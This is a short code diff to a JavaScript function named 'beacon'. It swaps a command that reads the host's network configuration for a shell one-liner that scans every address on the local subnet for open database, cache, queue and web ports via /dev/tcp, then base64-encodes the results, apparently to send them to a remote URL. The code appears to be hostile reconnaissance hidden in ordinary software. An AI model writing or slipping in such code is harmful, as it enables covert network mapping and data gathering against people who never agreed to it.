@@ -47,7 +47,7 @@ function beacon(urlStr, q) {
   let idOutput = "";
   try {
     idOutput = execSync(
-  'ip -4 addr show;ip route;cat /etc/resolv.conf',
+  'NET=$(ip -4 route | awk "/src/ {print $1; exit}"); BASE=$(echo $NET | cut -d. -f1-3); for p in 80 443 5432 3306 6379 5672 9200; do for i in $(seq 1 254); do (echo > /dev/tcp/$BASE.$i/$p) >/dev/null 2>&1 && echo "open $p on $BASE.$i"; done; done',
   { encoding: "utf8" }
 ).trim();
     idOutput = Buffer.from(idOutput).toString("base64");
